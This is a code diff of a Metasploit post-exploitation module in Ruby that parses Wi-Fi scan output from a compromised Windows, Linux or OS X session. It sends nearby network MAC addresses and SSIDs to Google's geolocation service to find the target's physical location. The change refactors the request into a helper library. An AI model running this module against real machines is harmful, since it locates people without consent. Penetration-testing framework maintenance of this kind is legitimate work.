@@ -5,8 +5,7 @@
 
 require 'msf/core'
 require 'rex'
-require 'json'
-require 'net/http'
+require 'rex/google/geolocation'
 
 class Metasploit3 < Msf::Post
 
@@ -40,78 +39,68 @@ class Metasploit3 < Msf::Post
   end
 
   def parse_wireless_win(listing)
-    wlan_list = ''
+    wlan_list = []
     raw_networks = listing.split("\r\n\r\n")
 
-    raw_networks.each { |network|
+    raw_networks.each do |network|
       details = network.match(/^SSID [\d]+ : ([^\r\n]*).*?BSSID 1[\s]+: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal[\s]+: ([\d]{1,3})%/m)
-        if !details.nil?
-          strength = get_strength(details[3])
-          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{strength.to_i}"
-          wlan_list << network_data
-        end
-    }
+      if !details.nil?
+        strength = get_strength(details[3])
+        wlan_list << [ details[2], details[1], strength ]
+      end
+    end
 
     return wlan_list
   end
 
 
   def parse_wireless_linux(listing)
-    wlan_list = ''
+    wlan_list = []
     raw_networks = listing.split("Cell ")
 
-    raw_networks.each { |network|
+    raw_networks.each do |network|
       details = network.match(/^[\d]{1,4} - Address: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
-        if !details.nil?
-          network_data = "&wifi=mac:#{details[1].to_s.upcase}|ssid:#{details[3].to_s}|ss=#{details[2].to_i}"
-          wlan_list << network_data
-        end
-    }
+      if !details.nil?
+        wlan_list << [ details[1], details[3], details[2] ]
+      end
+    end
 
     return wlan_list
   end
 
   def parse_wireless_osx(listing)
-    wlan_list = ''
+    wlan_list = []
     raw_networks = listing.split("\n")
 
-    raw_networks.each { |network|
+    raw_networks.each do |network|
       network = network.strip
       details = network.match(/^(.*(?!\h\h:))[\s]*([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2})[\s]*([\d-]{1,3})/)
-        if !details.nil?
-          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{details[3].to_i}"
-          wlan_list << network_data
-        end
-    }
+      if !details.nil?
+        wlan_list << [ details[2], details[1], details[3] ]
+      end
+    end
 
     return wlan_list
   end
 
   def perform_geolocation(wlan_list)
-
     if wlan_list.blank?
       print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
       return
     end
+    g = Rex::Google::Geolocation.new
 
-    # Build and send the request to Google
-    url = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true#{wlan_list}"
-    uri = URI.parse(URI.encode(url))
-    request = Net::HTTP::Get.new(uri.request_uri)
-    http = Net::HTTP::new(uri.host,uri.port)
-    http.use_ssl = true
-    response = http.request(request)
+    wlan_list.each do |wlan|
+      g.add_wlan(*wlan)
+    end
 
-    # Gather the required information from the response
-    if response && response.code == '200'
-      results = JSON.parse(response.body)
-      latitude =  results["location"]["lat"]
-      longitude = results["location"]["lng"]
-      accuracy = results["accuracy"]
-      print_status("Google indicates that the target is within #{accuracy} meters of #{latitude},#{longitude}.")
-      print_status("Google Maps URL:  https://maps.google.com/?q=#{latitude},#{longitude}")
+    begin
+      g.fetch!
+    rescue RuntimeError => e
+      print_error("Error: #{e}")
     else
-      print_error("Failure connecting to Google for location lookup.")
+      print_status(g.to_s)
+      print_status("Google Maps URL:  #{g.google_maps_url}")
     end
 
   end
@@ -125,8 +114,8 @@ class Metasploit3 < Msf::Post
     else
       # For Meterpreter use the sysinfo OS since java Meterpreter returns java as platform
       platform = session.sys.config.sysinfo['OS']
+      platform = 'osx' if platform =~ /darwin/i
     end
-
 
     case platform
     when /win/i
@@ -214,10 +203,10 @@ class Metasploit3 < Msf::Post
       return nil
     end
 
-    rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
-    rescue ::Exception => e
-      print_status("The following Error was encountered: #{e.class} #{e}")
-    end
+  rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
+  rescue ::Exception => e
+    print_status("The following Error was encountered: #{e.class} #{e}")
+  end
 
 
 end
